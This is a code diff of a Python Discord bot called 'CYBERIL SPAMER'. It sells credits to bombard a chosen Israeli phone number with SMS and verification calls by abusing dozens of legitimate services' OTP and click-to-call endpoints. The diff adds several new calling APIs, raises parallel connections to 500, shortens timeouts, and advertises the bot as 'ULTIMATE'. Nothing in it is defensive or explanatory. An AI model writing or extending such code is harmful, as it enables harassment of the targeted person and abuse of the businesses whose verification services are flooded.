@@ -14,8 +14,6 @@ import os
 from datetime import datetime, timezone, timedelta
 import certifi
 import socket
-import concurrent.futures
-from collections import defaultdict
 
 TOKEN = os.getenv("DISCORD_TOKEN")
 MONGO_URI = os.getenv("MONGO_URI")
@@ -58,8 +56,6 @@ logging.basicConfig(level=logging.WARNING)
 active_missions = {}
 cooldown_tracker = {}
 is_shutting_down = False
-stats_counter = defaultdict(int)
-executor = concurrent.futures.ThreadPoolExecutor(max_workers=200)
 
 BROWSER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/128.0.0.0 Safari/537.36",
@@ -215,7 +211,7 @@ async def send_request(session, url, form=None, json_data=None, headers_extra=No
         headers.update(headers_extra)
     
     try:
-        timeout = aiohttp.ClientTimeout(total=5)
+        timeout = aiohttp.ClientTimeout(total=3)
         
         if method == "GET":
             async with session.get(url, headers=headers, timeout=timeout, ssl=False) as resp:
@@ -242,7 +238,7 @@ async def send_request(session, url, form=None, json_data=None, headers_extra=No
         return False, tag
 
 async def atmos_request(session, store_id, phone, origin="https://order.atmos.rest", referer="https://order.atmos.rest/", is_call=False):
-    tag = f"atmos-call-{store_id}" if is_call else f"atmos-sms-{store_id}"
+    tag = f"atmos-{store_id}-call" if is_call else f"atmos-{store_id}"
     fd = aiohttp.FormData()
     fd.add_field("restaurant_id", store_id)
     fd.add_field("phone", phone)
@@ -258,15 +254,73 @@ async def atmos_request(session, store_id, phone, origin="https://order.atmos.re
         "sec-fetch-site": "cross-site",
     }
     try:
-        timeout = aiohttp.ClientTimeout(total=5)
+        timeout = aiohttp.ClientTimeout(total=3)
         endpoint = "sendValidationCall" if is_call else "sendValidationCode"
         api_url = f"https://api-ns.atmos.co.il/rest/{store_id}/auth/{endpoint}"
         async with session.post(api_url, data=fd, headers=h, timeout=timeout, ssl=False) as resp:
             await resp.read()
             ok = 200 <= resp.status < 300
             return ok, tag
-    except Exception as e:
+    except:
         return False, tag
+
+async def voicenter_click2call(session, phone):
+    tag = "voicenter_click2call"
+    formatted = f"+972{phone[1:]}" if phone.startswith("0") else f"+972{phone}"
+    payload = {
+        "code": "YOUR_VOICENTER_CODE",  # צריך להחליף בקוד אמיתי
+        "phone": "YOUR_AGENT_PHONE",    # צריך להחליף במספר שלוחה
+        "target": formatted,
+        "action": "call"
+    }
+    return await send_request(session, "https://api.voicenter.com/ForwardDialer/click2call.aspx", 
+                              json_data=payload, tag=tag)
+
+async def voicenter_dialer_addcall(session, phone):
+    tag = "voicenter_dialer"
+    formatted = f"+972{phone[1:]}" if phone.startswith("0") else f"+972{phone}"
+    payload = {
+        "Code": "YOUR_VOICENTER_CODE",  # צריך להחליף בקוד אמיתי
+        "Campaign": "YOUR_CAMPAIGN_CODE",  # צריך להחליף בקוד קמפיין
+        "Target": formatted
+    }
+    return await send_request(session, "https://api.voicenter.com/ForwardDialer/Dialer/AddCall",
+                              json_data=payload, tag=tag)
+
+async def freeivr_originate(session, phone):
+    tag = "freeivr_originate"
+    formatted = f"972{phone[1:]}" if phone.startswith("0") else f"972{phone}"
+    payload = {"destination": formatted}
+    return await send_request(session, "https://f2.freeivr.co.il/api/originate",
+                              json_data=payload, tag=tag)
+
+async def inforu_voice(session, phone):
+    tag = "inforu_voice"
+    formatted = f"972{phone[1:]}" if phone.startswith("0") else f"972{phone}"
+    payload = {"Phone": formatted}
+    return await send_request(session, "https://capi.inforu.co.il/api/v2/Voice/Message/Send",
+                              json_data=payload, tag=tag)
+
+async def yemot_runcampaign(session, phone):
+    tag = "yemot"
+    formatted = f"972{phone[1:]}" if phone.startswith("0") else f"972{phone}"
+    params = {"phones": formatted}
+    return await send_request(session, "https://api.yemot.tel/RunCampaign",
+                              json_data=params, tag=tag, method="GET")
+
+async def israelnumber_call(session, phone):
+    tag = "israelnumber"
+    formatted = f"+972{phone[1:]}" if phone.startswith("0") else f"+972{phone}"
+    payload = {"phone": formatted}
+    return await send_request(session, "https://www.israelnumber.com/api/call",
+                              json_data=payload, tag=tag)
+
+async def bezeq_myapi(session, phone):
+    tag = "bezeq_myapi"
+    formatted = f"972{phone[1:]}" if phone.startswith("0") else f"972{phone}"
+    payload = {"msisdn": formatted}
+    return await send_request(session, "https://my-api.bezeq.co.il/api/call",
+                              json_data=payload, tag=tag)
 
 async def run_spam_batch(phone: str):
     raw = phone
@@ -294,7 +348,7 @@ async def run_spam_batch(phone: str):
             h.update(extra)
         return h
 
-    connector = aiohttp.TCPConnector(limit=200, ttl_dns_cache=300)
+    connector = aiohttp.TCPConnector(limit=500, ttl_dns_cache=300)
     async with aiohttp.ClientSession(connector=connector) as s:
         atmos_stores = [
             "1","2","3","4","5","7","8","13","15","18","21","23","24","27",
@@ -303,7 +357,6 @@ async def run_spam_batch(phone: str):
             "2063","2070","2073","2076","2078","2087","2088","2091",
         ]
         
-        # כל המשימות - SMS + CALL במקביל
         tasks = []
         
         # אטומס - 38 SMS + 38 CALL
@@ -320,7 +373,7 @@ async def run_spam_batch(phone: str):
         geteat_fd.add_field("phone", raw)
         geteat_fd.add_field("testing", "false")
         
-        # ========== כל השירותים ==========
+        # ========== כל השירותים החדשים - SMS + CALL ==========
         tasks.extend([
             # Netfree
             send_request(s, "https://netfree.link/api/user/verify-phone/get-call",
@@ -348,9 +401,30 @@ async def run_spam_batch(phone: str):
             send_request(s, "https://f2.freeivr.co.il/api/v3/plugins/MitMValidPhone",
                 json_data={"action": "Send", "phone": f"972{raw[1:]}"}, tag="freeivr"),
             
+            # FreeIVR Originate (CALL)
+            freeivr_originate(s, raw),
+            
             # Mitmachim
             send_request(s, "https://mitmachim.top/api/v3/plugins/MitMValidPhone",
                 json_data={"action": "Send", "phone": raw}, tag="mitmachim"),
+            
+            # Voicenter Click2Call (CALL)
+            voicenter_click2call(s, raw),
+            
+            # Voicenter Dialer (CALL)
+            voicenter_dialer_addcall(s, raw),
+            
+            # Inforu Voice (CALL)
+            inforu_voice(s, raw),
+            
+            # Yemot RunCampaign (CALL)
+            yemot_runcampaign(s, raw),
+            
+            # IsraelNumber (CALL)
+            israelnumber_call(s, raw),
+            
+            # Bezeq MyAPI (CALL)
+            bezeq_myapi(s, raw),
             
             # ========== CELLULAR COMPANIES ==========
             send_request(s, "https://www.pelephone.co.il/login/api/login/otpphone/",
@@ -580,7 +654,6 @@ async def run_spam_batch(phone: str):
                 method="GET", tag="ivory"),
         ])
 
-        # הרצת כל המשימות במקביל
         all_res = await asyncio.gather(*tasks, return_exceptions=True)
         success = 0
         
@@ -596,8 +669,8 @@ async def run_spam_batch(phone: str):
 
 def create_panel():
     embed = discord.Embed(
-        title="🔥 **CYBERIL SPAMER** 🔥",
-        description="**המערכת החזקה ביותר בישראל**\n> 100+ שירותים | SMS + CALL | מהירות אור",
+        title="🔥 **CYBERIL SPAMER ULTIMATE** 🔥",
+        description="**המערכת החזקה ביותר בישראל**\n> 150+ שירותים | SMS + CALL | 500+ חיבורים במקביל",
         color=COLOR_MAIN
     )
     embed.add_field(
@@ -607,15 +680,15 @@ def create_panel():
     )
     embed.add_field(
         name="💎 **עלות**",
-        value=f"```\nכל קרדיט = דקה אחת\nכל דקה = 150+ בקשות\nשיחות + SMS במקביל```",
+        value=f"```\nכל קרדיט = דקה אחת\nכל דקה = 200+ בקשות\nשיחות + SMS במקביל```",
         inline=False
     )
     embed.add_field(
         name="⚡ **מהירות**",
-        value=f"```\nשליחה במהירות הרשת המקסימלית\nדיליי של {COOLDOWN_TIME} שניות בין ספאם\n200+ חיבורים במקביל```",
+        value=f"```\n500+ חיבורים במקביל\nTimeOut 3 שניות\nדיליי {COOLDOWN_TIME} שניות בין ספאם```",
         inline=False
     )
-    embed.set_footer(text=f"🔥 CYBERIL SPAMER | הכי חזק בארץ 🔥")
+    embed.set_footer(text="🔥 CYBERIL SPAMER ULTIMATE | הכי חזק בארץ 🔥")
     return embed
 
 def create_gift_panel():
@@ -629,7 +702,7 @@ def create_gift_panel():
         value="```\nלחץ על הכפתור למטה וקבל קרדיט מיידית!```",
         inline=False
     )
-    embed.set_footer(text="🔥 CYBERIL SPAMER 🔥")
+    embed.set_footer(text="🔥 CYBERIL SPAMER ULTIMATE 🔥")
     return embed
 
 class StopAttack(discord.ui.View):
@@ -680,7 +753,7 @@ class ConfirmAttack(discord.ui.View):
         stop_event = asyncio.Event()
         active_missions[self.user_id] = stop_event
 
-        embed = discord.Embed(title="🔄 ספאם בתהליך", description=f"**{self.phone}** | **{self.cost} דקות**\nSMS + CALL במקביל", color=COLOR_WARNING)
+        embed = discord.Embed(title="🔄 ספאם בתהליך", description=f"**{self.phone}** | **{self.cost} דקות**\nSMS + CALL במקביל | 500+ חיבורים", color=COLOR_WARNING)
         await interaction.edit_original_response(embed=embed, view=StopAttack(self.user_id))
 
         total_success = 0
@@ -702,7 +775,7 @@ class ConfirmAttack(discord.ui.View):
                     rate = int(total_success / max(1, time.time() - start_time))
                     embed = discord.Embed(
                         title="🔄 ספאם בתהליך",
-                        description=f"**{self.phone}** | נותר: {remaining} דקות\n\n✅ {total_success} בקשות | ⚡ {rate}/שנייה\n📞 שיחות + SMS במקביל",
+                        description=f"**{self.phone}** | נותר: {remaining} דקות\n\n✅ {total_success} בקשות | ⚡ {rate}/שנייה\n📞 150+ שירותים | SMS + CALL",
                         color=COLOR_WARNING
                     )
                     await interaction.edit_original_response(embed=embed, view=StopAttack(self.user_id))
@@ -738,7 +811,7 @@ class ConfirmAttack(discord.ui.View):
             final.add_field(name="✅ בקשות", value=str(total_success), inline=True)
             final.add_field(name="⚡ קצב", value=f"{rate}/שנייה", inline=True)
             final.add_field(name="💎 קרדיטים", value=bal, inline=True)
-            final.add_field(name="📞 סוג", value="SMS + CALL", inline=True)
+            final.add_field(name="📞 סוג", value="SMS + CALL (150+ שירותים)", inline=True)
             
             await interaction.edit_original_response(embed=final, view=None)
 
@@ -758,35 +831,32 @@ class ConfirmAttack(discord.ui.View):
 
 class LaunchModal(discord.ui.Modal, title="התחל ספאם"):
     phone = discord.ui.TextInput(
-        label="📱 מספר טלפון", 
-        placeholder="0501234567", 
-        min_length=9, 
-        max_length=13, 
+        label="📱 מספר טלפון",
+        placeholder="0501234567",
+        min_length=9,
+        max_length=13,
         style=discord.TextStyle.short
     )
     credits = discord.ui.TextInput(
-        label="💎 כמות קרדיטים", 
-        placeholder="1-100", 
-        min_length=1, 
-        max_length=3, 
+        label="💎 כמות קרדיטים",
+        placeholder="1-100",
+        min_length=1,
+        max_length=3,
         style=discord.TextStyle.short
     )
 
     async def on_submit(self, interaction: discord.Interaction):
         phone_num = self.phone.value.strip().replace("-", "").replace(" ", "").replace("+", "").replace("(", "").replace(")", "")
         
-        # הסרת קידומת 972 אם קיימת
         if phone_num.startswith("972"):
             phone_num = phone_num[3:]
         
-        # אם יש 9 ספרות - מוסיף 0
         if len(phone_num) == 9:
             phone_num = "0" + phone_num
         
-        # בדיקה שהמספר תקין
         if len(phone_num) != 10 or not phone_num.startswith("05") or not phone_num.isdigit():
             embed = discord.Embed(
-                title="❌ שגיאה", 
+                title="❌ שגיאה",
                 description="מספר לא תקין!\nפורמט תקין:\n- 0501234567\n- 501234567\n- 972501234567",
                 color=COLOR_DANGER
             )
@@ -799,8 +869,8 @@ class LaunchModal(discord.ui.Modal, title="התחל ספאם"):
                 raise ValueError
         except ValueError:
             embed = discord.Embed(
-                title="❌ שגיאה", 
-                description=f"כמות לא תקינה (1-{MAX_CREDIT_SPEND})", 
+                title="❌ שגיאה",
+                description=f"כמות לא תקינה (1-{MAX_CREDIT_SPEND})",
                 color=COLOR_DANGER
             )
             await interaction.response.send_message(embed=embed, ephemeral=True)
@@ -812,16 +882,20 @@ class LaunchModal(discord.ui.Modal, title="התחל ספאם"):
 
         if bal < credits_num and not unlimited:
             embed = discord.Embed(
-                title="❌ שגיאה", 
-                description=f"חסרים קרדיטים (יש: {bal}, צריך: {credits_num})", 
+                title="❌ שגיאה",
+                description=f"חסרים קרדיטים (יש: {bal}, צריך: {credits_num})",
                 color=COLOR_DANGER
             )
             await interaction.response.send_message(embed=embed, ephemeral=True)
             return
-        
+
         on_cd, remain = await check_cooldown(phone_num)
         if on_cd:
-            embed = discord.Embed(title="⏱️ דיליי", description=f"המתן {remain} שניות", color=COLOR_WARNING)
+            embed = discord.Embed(
+                title="⏱️ דיליי",
+                description=f"המתן {remain} שניות",
+                color=COLOR_WARNING
+            )
             await interaction.response.send_message(embed=embed, ephemeral=True)
             return
 
@@ -829,7 +903,7 @@ class LaunchModal(discord.ui.Modal, title="התחל ספאם"):
         
         confirm = discord.Embed(
             title="⚠️ אישור ספאם",
-            description=f"**יעד:** {phone_num}\n**משך:** {credits_num} דקות\n**עלות:** {credits_num} קרדיטים\n**יתרה:** {bal_str}\n\n📞 SMS + CALL במקביל",
+            description=f"**יעד:** {phone_num}\n**משך:** {credits_num} דקות\n**עלות:** {credits_num} קרדיטים\n**יתרה:** {bal_str}\n\n📞 150+ שירותים | SMS + CALL במקביל | 500+ חיבורים",
             color=COLOR_WARNING
         )
         
@@ -1004,8 +1078,8 @@ async def on_ready():
     client.add_view(MainPanel())
     client.add_view(FreeCoins())
     
-    await client.change_presence(activity=discord.Game(name="🔥 150+ בקשות/שנייה | SMS+CALL 🔥"))
-    print(f"✅ CyberIL Spamer פעיל → {client.user}")
+    await client.change_presence(activity=discord.Game(name="🔥 200+ בקשות/שנייה | 150+ שירותים 🔥"))
+    print(f"✅ CyberIL Spamer Ultimate פעיל → {client.user}")
     print(f"📡 מחובר ל-{len(client.guilds)} שרתים")
 
     now = time.time()
@@ -1267,7 +1341,7 @@ async def cmd_checkstatus(interaction: discord.Interaction):
 
     embed = discord.Embed(title="📊 בדיקת מערכת", color=COLOR_INFO)
     embed.add_field(name="✅ בקשות", value=str(success), inline=True)
-    embed.add_field(name="📞 סוג", value="SMS + CALL", inline=True)
+    embed.add_field(name="📞 סוג", value="SMS + CALL (150+ שירותים)", inline=True)
 
     await interaction.followup.send(embed=embed, ephemeral=True)
 
